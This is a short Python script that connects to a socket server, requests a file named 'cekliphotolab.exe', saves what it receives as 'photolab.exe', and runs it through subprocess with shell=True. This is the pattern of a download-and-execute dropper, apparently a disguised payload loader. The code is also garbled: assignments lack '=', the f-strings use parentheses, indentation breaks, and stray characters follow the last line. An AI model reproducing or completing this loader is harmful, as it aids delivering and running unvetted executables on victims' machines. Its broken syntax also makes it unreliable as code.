import socket

import subprocess

try:

   with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:

     client_socket.connect(('127.0.0.1', 56))

     filename = "cekliphotolab.exe"

     client_socket.sendall (filename.encode())
  
     file_data client_socket.recv(1024)

     with open("photolab.exe", 'wb') as f:

        f.write(file_data)

        print(f"Received (filename) from the server.")

        exe_path "photolab.exe"

        try:

          subprocess.run(exe_path, shell=True)

         except Exception as e:

          print(f"Error: (e)")

except Exception as e:

    print(f"Error: (e)")rq  wacZ